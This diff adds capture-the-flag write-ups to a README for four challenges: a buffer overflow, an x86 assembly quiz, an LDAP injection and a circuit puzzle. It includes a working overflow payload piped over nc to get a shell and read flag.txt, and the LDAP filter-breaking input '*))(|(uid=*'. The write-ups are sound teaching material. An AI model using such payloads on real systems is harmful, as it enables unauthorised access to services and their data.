@@ -320,7 +320,46 @@ So, the flag is : ``flag{Y0u_Arrre_th3_Bi66Est_of_boiiiiis}``
 
 
 ### Write-up
-Coming soon.
+I tried writing a write-up but after reading another one, I felt uncomfortable to write it.
+
+This is the greatest write-up of this task that I recommand reading it :
+
+[https://ctftime.org/writeup/11221](https://ctftime.org/writeup/11221)
+
+Which is a shortcut it this one :
+
+[https://github.com/b01lers/writeups/blob/master/2018/csaw/get_it/writeup.md](https://github.com/b01lers/writeups/blob/master/2018/csaw/get_it/writeup.md)
+
+My solution was closer because it remains to some payload :
+
+```
+python -c "print 'A'*40+'\xb6\x05\x40\x00\x00\x00\x00\x00'" > payload
+(cat payload; cat) | nc pwn.chal.csaw.io 9001
+```
+
+Output :
+
+<p align="center">
+<img src="resources/pwn-50-get_it/1.PNG"/>
+</p>
+
+Now, we got the shell !
+
+We can also get the flag :
+
+```
+id
+ls
+cat flag.txt
+```
+
+Output :
+
+<p align="center">
+<img src="resources/pwn-50-get_it/2.PNG"/>
+</p>
+
+So, the flag is `flag{y0u_deF_get_itls}`.
 
 
 
@@ -351,8 +390,88 @@ Coming soon.
 
 
 ### Write-up
-Coming soon.
+In this task, we only need the [stage-1.asm](resources/reversing-50-a_tour_of_x86_part_1/stage-1.asm) file.
 
+The other files are needed in the next stage which I haven't already solve it.
+
+I just readed this asm file and I answered to the five question in the socket connexion opened with `nc rev.chal.csaw.io 9003`.
+
+> Question 1 : What is the value of dh after line 129 executes? (Answer with a one-byte hex value, prefixed with '0x')
+
+Resume of the instructions :
+
+```
+xor dh, dh ; => dh xor dh = 0. So the result in hexadecimal is 0x00
+```
+
+> Question 2 : What is the value of gs after line 145 executes? (Answer with a one-byte hex value, prefixed with '0x')
+
+Resume of the instructions :
+
+```
+mov dx, 0xffff  ; => dx=0xffff
+not dx ; => dx=0x0000
+mov gs, dx ; => gs=dx=0x0000
+```
+
+> Answer 3 : What is the value of si after line 151 executes? (Answer with a two-byte hex value, prefixed with '0x')
+
+Resume of the instructions :
+
+```
+mov cx, 0 ; cx=0x0000 ; Registers that ends with 'x' are composed of low and high registers (cx=ch 'concatenated with' cl)
+mov sp, cx ; => sp=cx=0x0000
+mov si, sp ; => si=sp=0x0000
+```
+
+> Answer 4 : What is the value of ax after line 169 executes? (Answer with a two-byte hex value, prefixed with '0x')
+
+Resume of the instructions :
+
+```
+mov al, 't' ; => al='t'=0x74 (in hexadecimal)
+mov ah, 0x0e ; => ah=0x0e. So ax=0x0e74. Because ax=ah 'concatenated with' al
+```
+
+> Answer 5 : What is the value of ax after line 199 executes for the first time? (Answer with a two-byte hex value, prefixed with '0x')
+
+Resume of the instructions :
+
+```
+.string_to_print: db "acOS", 0x0a, 0x0d, "  by Elyk", 0x00  ; label: <size-of-elements> <array-of-elements>
+mov ax, .string_to_print ; 'ax' gets the value of the 'db' array of bytes of the .string_to_print section
+mov si, ax ; si=ax
+mov al, [si] ; 'al' gets the address of the array of bytes of the .string_to_print section. Which means that it gets the address of the first byte. So al=0x61
+mov ah, 0x0e ; ah=0x0e. So ax=0x0e61. Because ax=ah 'concatenated with' al
+```
+
+Then, we send our answers to the server :
+
+Input and output :
+
+```
+nc rev.chal.csaw.io 9003
+........................................
+Welcome!
+
+What is the value of dh after line 129 executes? (Answer with a one-byte hex value, prefixed with '0x')
+0x00
+
+What is the value of gs after line 145 executes? (Answer with a one-byte hex value, prefixed with '0x')
+0x00
+
+What is the value of si after line 151 executes? (Answer with a two-byte hex value, prefixed with '0x')
+0x0000
+
+What is the value of ax after line 169 executes? (Answer with a two-byte hex value, prefixed with '0x')
+0x0e74
+
+What is the value of ax after line 199 executes for the first time? (Answer with a two-byte hex value, prefixed with '0x')
+0x0e61
+flag{rev_up_y0ur_3ng1nes_reeeeeeeeeeeeecruit5!}
+```
+
+So, the flag is `flag{rev_up_y0ur_3ng1nes_reeeeeeeeeeeeecruit5!}`
 
 
 
@@ -376,42 +495,41 @@ Coming soon.
 </p>
 
 ### Write-up
-Coming soon.
+This task was a kind of LDAP Injection.
 
-
-
-
-
-
-
-
-## babycrypto
-
-**Category:** Crypto
-**Points:** 50
-**Solved:** 295
-**Description:**
-
-> yeeeeeeeeeeeeeeeeeeeeeeeeeeeeeet
-
-> single yeet yeeted with single yeet == 0
-
-> yeeet
-
-> what is yeet?
-
-> yeet is yeet
-
-> Yeetdate: yeeted yeet at yeet: 9:42 pm
-
-**Attached:** [ciphertext.txt](resources/crypto-50-babycrypto/ciphertext.txt)
+After we visit this page `http://web.chal.csaw.io:8080` in the web browser, we get this result :
 
 <p align="center">
-<img src="resources/crypto-50-babycrypto/_description.PNG"/>
+<img src="resources/web-50-ldab/1.PNG"/>
+</p>
+<p align="center">
+<img src="resources/web-50-ldab/2.PNG"/>
 </p>
 
-### Write-up
-Coming soon.
+After some search tries, I understood that there is a filter like this `(&(GivenName=<OUR_INPUT>)(!(GivenName=Flag)))` (the blocking filter is in the right side, not in the left side).
+
+I understood this after solving this task. But, I'm gonna explain what is the injected payload and how it worked.
+
+The payload choosed was `*))(|(uid=*`.
+
+And this payload set as an input, when it replaces `<OUR_INPUT>`, the filter will looks like this : `(&(GivenName=*))(|(uid=*)(!(GivenName=Flag)))`.
+
+This is interpreted as :
+
+> Apply an AND operator between `(GivenName=*)` which will always succeed.
+
+> Apply an OR operator between `(uid=*)` and `(!(GivenName=Flag))` which will succeed but it doesn't show the flag.
+
+As I understood, the default operator between these two conditions is an OR operator if there is no operator specified.
+
+So, after setting `*))(|(uid=*` as an input, we will get the flag :
+
+<p align="center">
+<img src="resources/web-50-ldab/3.PNG"/>
+</p>
+
+So, the flag is `flag{ld4p_inj3ction_i5_a_th1ng}`.
+
 
 
 
@@ -443,7 +561,90 @@ In this task we are given a photo that contains a circuit from which we should f
 
 Personally, I solved this task without that hint.
 
-Coming soon
+I'm gonna relate how I solved this task. It was not so easy if you can't get it.
+
+After seeing this given picture and after reading the description, I was confused. Is it rotated correctly ? Or should we find the correct rotation ?
+
+<p align="center">
+<img src="resources/misc-75-short_circuit/20180915_074129.jpg"/>
+</p>
+
+So, I choosed this rotation because it looks better for me (that I can think better with a relaxed mind) :
+
+<p align="center">
+<img src="resources/misc-75-short_circuit/1.jpg"/>
+</p>
+
+Maybe, I choosed this rotation also because of these hints :
+
+<p align="center">
+<img src="resources/misc-75-short_circuit/2.PNG"/>
+</p>
+
+I tried to determinde the path between the 2 +Vcc :
+
+<p align="center">
+<img src="resources/misc-75-short_circuit/3.png"/>
+</p>
+
+In the first impression, after seeing the LED Diodes, I said
+
+> "Maybe we should find the bits from each led : 1 if the electricity goes through the LED and 0 if not".
+
+So let's fix some concepts. In physics, the electricity goes through an electric component IF there is no short circuit or if the electricity reach the ground. This is what I say in physics related to this task
+
+Also, a short circuit means that the input node have the same voltage as the output node. So the electricity will go from node A to node B through the cable without going in the other path through any other electric component.
+
+So, for the first 16 bits it was OK, I found the begining of the format flag 'flag{}' only for 2 bytes 'fl'. And I was excited :
+
+<p align="center">
+<img src="resources/misc-75-short_circuit/4.png"/>
+</p>
+
+I commented on 'Counts as 2 each' and I said "Of course because there is 2 LED Diodes. What a useless information".
+
+But starting for the third byte, it was a disaster. I was affraid that I was bad in physics. And it was impossible for me to get even a correct character from the flag format 'flag{}'.
+
+I said maybe I'm wrong for the orientation. Since, in the description, the author mentionned that we should ignore the first bit.
+
+I said, the flag characters are they 7-bits and shall we add the last bit as a 0 ? The answer was 'No'.
+
+I changed the orientation 180 degree. But, I didn't get any flag format.
+
+In the both directions, there is many non-ascii characters.
+
+And I was confused of seeing the same LED diode connected multiple times to the path. So, when I should set a value (0 or 1) to the LED Diode, I say 'should it be 'xx1xxxx' (setting the LED value in the first match) or 'xxxxx1x' (setting the LED value in the last match) 'xx1xx1x' (setting the LED value in all matches) ?
+
+Example :
+
+<p align="center">
+<img src="resources/misc-75-short_circuit/5.png"/>
+</p>
+
+Should it be '1xxxx' (1 related to the LED marked with a green color) or should it be 'xxxx1' or should it be all of these as '1xxxx1' ?
+
+I was just stuck.
+
+And finally in the last 10 minutes before the end of the CTF I get it !
+
+It was not `for each LED Diode we count a bit`. Instead it was `For each cable connected to the principle path, we count a bit`:
+
+<p align="center">
+<img src="resources/misc-75-short_circuit/6.png"/>
+</p>
+
+Finally, we get the following bits :
+
+```
+01100110 01101100 01100001 01100111 01111011 01101111 01110111 01101101 01111001 01101000 01100001 01101110 01100100 01111101
+```
+
+Which are in ascii `flag{owmyhand}`.
+
+So, the flag is `flag{owmyhand}`.
+
+
+
 
 
 
